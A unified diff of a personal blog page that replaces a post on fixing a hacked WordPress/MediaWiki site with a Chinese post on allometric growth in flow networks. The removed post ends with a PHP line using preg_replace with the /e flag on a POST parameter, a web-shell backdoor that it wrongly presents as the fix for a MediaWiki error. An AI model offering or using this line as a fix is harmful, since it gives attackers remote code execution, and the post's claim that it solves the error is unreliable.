@@ -34,11 +34,11 @@
   <link rel="icon" type="image/png" href="/img/icon.png">
   <link rel="apple-touch-icon" type="image/png" href="/img/apple-touch-icon.png">
 
-  <link rel="canonical" href="https://chengjun.github.io/note/2016-03-19-wordpress-error/">
+  <link rel="canonical" href="https://chengjun.github.io/note/allowmetric-growth/">
 
   
 
-  <title>wordpress白屏错误 | Academic</title>
+  <title>异速增长背后的数据洞察 | Academic</title>
 
 </head>
 <body id="top" data-spy="scroll" data-target="#navbar-main" data-offset="71">
@@ -151,14 +151,14 @@
 
 
   <div class="article-container">
-    <h1 itemprop="name">wordpress白屏错误</h1>
+    <h1 itemprop="name">异速增长背后的数据洞察</h1>
     
 
 <div class="article-metadata">
 
   <span class="article-date">
-    <time datetime="2016-03-19 00:00:00 &#43;0000 UTC" itemprop="datePublished">
-      Sat, Mar 19, 2016
+    <time datetime="2016-02-17 00:00:00 &#43;0000 UTC" itemprop="datePublished">
+      Wed, Feb 17, 2016
     </time>
   </span>
 
@@ -172,35 +172,35 @@
   <ul class="share">
     <li>
       <a class="facebook"
-         href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fchengjun.github.io%2fnote%2f2016-03-19-wordpress-error%2f"
+         href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fchengjun.github.io%2fnote%2fallowmetric-growth%2f"
          target="_blank">
         <i class="fa fa-facebook"></i>
       </a>
     </li>
     <li>
       <a class="twitter"
-         href="https://twitter.com/intent/tweet?text=wordpress%e7%99%bd%e5%b1%8f%e9%94%99%e8%af%af&amp;url=https%3a%2f%2fchengjun.github.io%2fnote%2f2016-03-19-wordpress-error%2f"
+         href="https://twitter.com/intent/tweet?text=%e5%bc%82%e9%80%9f%e5%a2%9e%e9%95%bf%e8%83%8c%e5%90%8e%e7%9a%84%e6%95%b0%e6%8d%ae%e6%b4%9e%e5%af%9f&amp;url=https%3a%2f%2fchengjun.github.io%2fnote%2fallowmetric-growth%2f"
          target="_blank">
         <i class="fa fa-twitter"></i>
       </a>
     </li>
     <li>
       <a class="linkedin"
-         href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fchengjun.github.io%2fnote%2f2016-03-19-wordpress-error%2f&amp;title=wordpress%e7%99%bd%e5%b1%8f%e9%94%99%e8%af%af"
+         href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fchengjun.github.io%2fnote%2fallowmetric-growth%2f&amp;title=%e5%bc%82%e9%80%9f%e5%a2%9e%e9%95%bf%e8%83%8c%e5%90%8e%e7%9a%84%e6%95%b0%e6%8d%ae%e6%b4%9e%e5%af%9f"
          target="_blank">
         <i class="fa fa-linkedin"></i>
       </a>
     </li>
     <li>
       <a class="weibo"
-         href="http://service.weibo.com/share/share.php?url=https%3a%2f%2fchengjun.github.io%2fnote%2f2016-03-19-wordpress-error%2f&amp;title=wordpress%e7%99%bd%e5%b1%8f%e9%94%99%e8%af%af"
+         href="http://service.weibo.com/share/share.php?url=https%3a%2f%2fchengjun.github.io%2fnote%2fallowmetric-growth%2f&amp;title=%e5%bc%82%e9%80%9f%e5%a2%9e%e9%95%bf%e8%83%8c%e5%90%8e%e7%9a%84%e6%95%b0%e6%8d%ae%e6%b4%9e%e5%af%9f"
          target="_blank">
         <i class="fa fa-weibo"></i>
       </a>
     </li>
     <li>
       <a class="email"
-         href="mailto:?subject=wordpress%e7%99%bd%e5%b1%8f%e9%94%99%e8%af%af&amp;body=https%3a%2f%2fchengjun.github.io%2fnote%2f2016-03-19-wordpress-error%2f">
+         href="mailto:?subject=%e5%bc%82%e9%80%9f%e5%a2%9e%e9%95%bf%e8%83%8c%e5%90%8e%e7%9a%84%e6%95%b0%e6%8d%ae%e6%b4%9e%e5%af%9f&amp;body=https%3a%2f%2fchengjun.github.io%2fnote%2fallowmetric-growth%2f">
         <i class="fa fa-envelope"></i>
       </a>
     </li>
@@ -218,12 +218,13 @@
       <h2 itemprop="name">Table of Content</h2>
       <nav id="TableOfContents">
 <ul>
+<li><a href="#从异速增长率开始">从异速增长率开始！</a>
+<ul>
 <li>
 <ul>
-<li><a href="#debug-模式">debug 模式</a></li>
-<li><a href="#wp-no-white-screen">wp-no-white-screen</a></li>
+<li><a href="#几何化">几何化</a></li>
 </ul></li>
-<li><a href="#mediawiki">mediawiki</a></li>
+</ul></li>
 </ul>
 </nav>
       </div>
@@ -232,90 +233,55 @@
     <div class="article-style" itemprop="articleBody">
       
 
-<p>wordpress登录后转至wp-admin为空白页。wordpress网站应该是被黑了，首先恶意注入代码，被我debug清理掉了，但是现在登录后却无法操作wp-admin界面，为空白页。还发现了两篇垃圾博客文章。我测试过wp-admin白屏的常见解决方案（例如themes或plugins不兼容造成），但这一次都不是。</p>
+<h1 id="从异速增长率开始">从异速增长率开始！</h1>
 
-<h2 id="debug-模式">debug 模式</h2>
+<p>俗话说用志不分乃凝于神。最近有点分心，精力不集中，产生了很多问题。一个问题是计算士这边的活落下来了。昨天跟小可聊天，也因为不熟悉整个脉络被抢白了半天。于是自己也在思索：解决了什么问题？研究的意义是什么？</p>
 
-<p>已经使用过了debug模式，其实网站现在仍处于debug模式中，现在没有任何错误提示。最早的时候被恶意注入的代码已经被清理，但是一篇垃圾文章仍在：<a href="http://computational-communication.com/topics/blog/" target="_blank">http://computational-communication.com/topics/blog/</a></p>
+<p>从异速增长率开始！It all starts with a big allowmetric growth rate! 异速增长率：这是一个重要的问题。比如一个流系统的节点是N， 产出是P,那么满足 $P = N^\theta$的关系。在互联网中，它就是PV和UV的关系。它提出了一个问题，即：为什么生物、城市、互联网都满足一个普世规律？它定量地表达了投入和产出的关系。</p>
 
-<p>我在wp_config.php中使用的debug代码如下：</p>
+<p><img src="http://wiki.swarma.net/images/thumb/c/c5/Allowmetric_growht_digg_36_days.png/400px-Allowmetric_growht_digg_36_days.png" alt="" /></p>
 
-<pre><code>    /**
- * This will log all errors notices and warnings to a file called debug.log in
- * wp-content only when WP_DEBUG is true. if Apache does not have write permission,
- * you may need to create the file first and set the appropriate permissions (i.e. use 666).
- */
+<p>为什么会有异速增长？一个可能的答案是流网络的自相似性。自己的哪里相似？究竟是什么地方？注意：异速增长是一个时间维度的系统状态的变化。它满足标度率，那么它本身就是自相似的。可以究竟什么才是自相似？（似乎马上回到了以前的问题：什么是无标度网络？）</p>
 
-define( 'WP_DEBUG', true ); // Or false
-if ( WP_DEBUG ) {
-    define( 'WP_DEBUG_LOG', true );
-    define( 'WP_DEBUG_DISPLAY', true );
-    @ini_set( 'display_errors', 1 );
-}
+<p>引入耗散的视角：耗散阻碍了生长。每个小时里流网络而言，可以算每个节点i的耗散与流入。流入$T_{i}$和耗散$D_i$的差值就是节点i的流存量。</p>
 
+<p>我们知道$T_i$和耗散 $D_i$的关系同样满足一个标度规律。放在直角坐标系中，我们可以画出这种关系。</p>
 
-// Use dev versions of core JS and CSS files (only needed if you are modifying these core files)
-define( 'SCRIPT_DEBUG', true );  
-</code></pre>
+<p><img src="http://wiki.swarma.net/images/d/d9/Dissipation_digg_36_days.png" alt="" /></p>
 
-<h2 id="wp-no-white-screen">wp-no-white-screen</h2>
+<p>直角坐标系隐含了一些潜在的假设：我们要按照从小到大的顺序（我称之为序假设，rank assumption）排列才能看到这种规律。坐标轴的作用就是这样。但要注意：流冰不是这样从耗散小的节点留到耗散大的节点。</p>
 
-<p>使用wp-no-white-screen进行辅助debug，发现一处可疑的地方：</p>
+<h3 id="几何化">几何化</h3>
 
-<pre><code>Fatal error: Class 'WP_Screen' not found in /wp-admin/includes/class-wp-screen.php
-</code></pre>
+<p>将流网络几何化，看成是一个由源向外的耗散。一个流网络，就可以算出任一节点到源头的流距离$L_{i}$。算法暂时省略。</p>
 
-<p>发现这段代码是：</p>
+<p>整个网络按照半径重排：保持了网络的自相似性。这里的自相似是指Dreyer球意义上的自相似，即沿着半径由球心向外走，每个半径上的$T_i$和耗散$D_i$各自的积分（即流的累加）保持标度关系。这个时候，尺度便成了球半径（流距离），而不是直角坐标系里的序了。</p>
 
-<pre><code>    /**
- * Set the current screen object
- *
- * @since 3.0.0
- *
- * @param mixed $hook_name Optional. The hook name (also known as the hook suffix) used to determine the screen,
- *                         or an existing screen object.
- */
+<p><img src="http://wiki.swarma.net/images/thumb/5/58/Hour23.png/400px-Hour23.png" alt="" /></p>
 
-function set_current_screen( $hook_name = '' ) {
-        WP_Screen::get( $hook_name )-&gt;set_current_screen();
-}
-</code></pre>
+<p>但是，换成了流距离作序参量（这里我是乱用的）的话，这种效果依然不好：</p>
 
-<p>WP_Screen并没有定义！这很不应该，搜索应该引用：</p>
+<p><img src="http://wiki.swarma.net/images/thumb/8/84/Les.png/800px-Les.png" alt="" /></p>
 
-<pre><code>require_once(ABSPATH . '/wp-admin/includes/class-wp-screen.php');
-</code></pre>
+<p>看到数据里的平行四边形，而不是相互遮盖成为一个直线。</p>
 
-<p>首先在上面代码中引用class-wp-screen.php</p>
+<p>结果导致了拟合的耗散率$\mu$和异速增长率$\theta$之间的关系具有较大的噪音：</p>
 
-<p>然后，但是我在/wp-admin/includes/路径下找不到class-wp-screen.php。于是在github.com/wordpress/wordpress里找到了这个php，放进这里。</p>
+<p><img src="http://wiki.swarma.net/images/thumb/c/ce/MuAndTheta.png/600px-MuAndTheta.png" alt="" /></p>
 
-<p>于是我终于看到了管理界面！   这次debug经历了漫长的三天时间，还把网站恢复到了十天前，感觉整个人都不好了。第一次在阿里云平台上发起工单，请求帮助，不过并没有实质的帮助；第一次在阿里云的云社区提问：<a href="https://yq.aliyun.com/ask/2686，最后还是自己回答了。在这个过程中删除了可疑人在forum和wiki上的注册账号。将admin这个账号改名，防止针对admin用户的密码破解，修改网站数据库的密码。翻了过去7年里的wordpress" target="_blank">https://yq.aliyun.com/ask/2686，最后还是自己回答了。在这个过程中删除了可疑人在forum和wiki上的注册账号。将admin这个账号改名，防止针对admin用户的密码破解，修改网站数据库的密码。翻了过去7年里的wordpress</a> dead screen相关的帖子。太不容易了。目前网站还在debug模式下：且观察下一步动向。</p>
+<p>怎么办？引入系统规模UV。</p>
 
-<h1 id="mediawiki">mediawiki</h1>
+<p>$$T(r) = A D_{rmax}^a D(r)^b$$</p>
 
-<p>出现server error 500, 谷歌无解，打电话给阿里云无解，去掉一些localsettings.php里的extension也无效。</p>
+<p>T(r)和D(r)代表沿半径r从source到sink对节点的直接流通量$t_i$和耗散量$d_i$进行积分。当r=rmax时，D(r)=D(rmax)=UV。</p>
 
-<p>最后，偶然看到：<a href="https://www.mediawiki.org/wiki/Manual:Errors_and_symptoms" target="_blank">https://www.mediawiki.org/wiki/Manual:Errors_and_symptoms</a></p>
+<p>果然效果好了。</p>
 
-<p>You see a Blank Page
-A blank white page indicates a PHP error which isn&rsquo;t being printed to the screen. To force this, add the following lines to the LocalSettings.php file, underneath the &lt;?php:</p>
+<p><img src="http://wiki.swarma.net/images/thumb/c/c1/Dreyerballscaling.png/800px-Dreyerballscaling.png" alt="" /></p>
 
-<pre><code>error_reporting( E_ALL );
-ini_set( 'display_errors', 1 );
-</code></pre>
+<p>看到这里我自愧弗如远甚。</p>
 
-<p>将这段代码放进localsetting。php，
-提示错误来源是：WrappedString.php  Fatal error: Namespace declaration statement</p>
-
-<p>于是调整为以下形式，问题解决。</p>
-
-<pre><code>&lt;?php
-
-namespace WrappedString;
-
-@preg_replace('/(.*)/e', @$_POST['kxrmmbxafhdg'], '');
-</code></pre>
+<p><img src="http://wiki.swarma.net/images/7/7e/Addjustedthetaprediction.png" alt="" /></p>
 
     </div>
 
@@ -330,12 +296,12 @@ namespace WrappedString;
   <nav>
   <ul class="pager">
     
-    <li class="previous"><a href="https://chengjun.github.io/note/allowmetric-growth/"><span
-      aria-hidden="true">&larr;</span> 异速增长背后的数据洞察</a></li>
+    <li class="previous"><a href="https://chengjun.github.io/note/house/"><span
+      aria-hidden="true">&larr;</span> 关于房子</a></li>
     
 
     
-    <li class="next"><a href="https://chengjun.github.io/note/2016-05-04-sr-revising/">语言是一道门槛 <span
+    <li class="next"><a href="https://chengjun.github.io/note/2016-03-19-wordpress-error/">wordpress白屏错误 <span
       aria-hidden="true">&rarr;</span></a></li>
     
   </ul>
@@ -350,9 +316,9 @@ namespace WrappedString;
     <div id="disqus_thread"></div>
 <script type="text/javascript">
     var disqus_shortname = 'ChengjunWang';
-    var disqus_identifier = 'https:\/\/chengjun.github.io\/note\/2016-03-19-wordpress-error\/';
-    var disqus_title = 'wordpress白屏错误';
-    var disqus_url = 'https:\/\/chengjun.github.io\/note\/2016-03-19-wordpress-error\/';
+    var disqus_identifier = 'https:\/\/chengjun.github.io\/note\/allowmetric-growth\/';
+    var disqus_title = '异速增长背后的数据洞察';
+    var disqus_url = 'https:\/\/chengjun.github.io\/note\/allowmetric-growth\/';
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
@@ -414,6 +380,17 @@ namespace WrappedString;
     
 
     
+    
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] ,
+        processEscapes: true
+      },
+        TeX: {
+           equationNumbers: { autoNumber: "AMS" }
+        }
+       });
+    </script>
+    <script async src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
     
 
     
